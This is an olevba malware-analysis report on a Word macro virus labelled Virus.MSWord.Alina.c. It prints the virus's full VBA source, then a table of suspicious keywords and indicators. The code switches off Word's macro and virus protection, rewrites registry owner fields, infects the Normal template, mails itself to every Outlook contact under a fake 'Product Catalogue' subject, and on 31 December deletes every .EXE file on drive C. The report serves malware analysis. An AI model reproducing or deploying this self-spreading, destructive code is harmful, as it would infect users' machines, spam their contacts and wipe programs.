olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alina.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alina.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()
Call Alina
End Sub
Private Sub Document_Close()
Call Alina
End Sub
Private Sub Document_Open()
Call Alina
End Sub
Private Sub Alina()
On Error Resume Next
CustomizationContext = NormalTemplate
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") <> "L21TF21R/L9T15N" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "L21TF21R/L9T15N"""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Sh9br1mp21r/C15m9ll1"
End If
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot")
Set ADC1 = ActiveDocument.VBProject.VBComponents(1)
Set NDC1 = NormalTemplate.VBProject.VBComponents(1)
ExportFile1 = SR + "\Fateha.Dll"
ExportFile2 = SR + "\Invoice.Dll"
If Dir(ExportFile1) = "Fateha.dll" Then Kill ExportFile1
If Dir(ExportFile2) = "Invoice.dll" Then Kill ExportFile2
If ADC1.CodeModule.CountOfLines > 0 Then ADC1.Export (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then NDC1.Export (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For I = 1 To ADC1.CodeModule.CountOfLines
ADC1.CodeModule.DeleteLines 1
Next
End If
ADC1.CodeModule.AddFromFile (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For I = 1 To 4
ADC1.CodeModule.DeleteLines 1
Next
Else
ADC1.CodeModule.AddFromFile (ExportFile1)
For I = 1 To 4
ADC1.CodeModule.DeleteLines 1
Next
End If
If NDC1.CodeModule.CountOfLines > 0 Then
For I = 1 To NDC1.CodeModule.CountOfLines
NDC1.CodeModule.DeleteLines 1
Next
End If
NDC1.CodeModule.AddFromFile (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then
For I = 1 To 4
NDC1.CodeModule.DeleteLines 1
Next
Else
NDC1.CodeModule.AddFromFile (ExportFile2)
For I = 1 To 4
NDC1.CodeModule.DeleteLines 1
Next
End If
If Application.MAPIAvailable = True Then
Dim UDO, DMN, BUOS
Set UDO = CreateObject("Outlook.Application")
Set DMN = UDO.GetNameSpace("MAPI")
DMN.Logon "profile", "password"
For l = DMN.AddressLists.Count To 1 Step -1
Set ADB = DMN.AddressLists(l)
I = 0
Set BUOS = UDO.CreateItem(0)
For t = ADB.AdressEntries.Count To 1 Step -1
o = ADB.AddressEntries(I)
BUOS.Recipients.Add o
I = I + 1
If I = ADB.AddressEntries.Count Then
t = 1
End If
Next t
BUOS.Subject = "Product Catalogue."
BUOS.Body = "Our product catalogue attached here:="
BUOS.Attachments.Add ActiveDocument.FullName
BUOS.Send
o = ""
Next l
DMN.Logoff
End If
If Day(Now) = 31 And Month(Now) = 12 Then
With Application.FileSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.EXE"
    .Execute
    For I = 1 To .FoundFiles.Count
    Kill .FoundFiles(I)
    Next I
End With
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Fateha.Dll          |Executable file name                         |
|IOC       |Invoice.Dll         |Executable file name                         |
|IOC       |Fateha.dll          |Executable file name                         |
|IOC       |Invoice.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

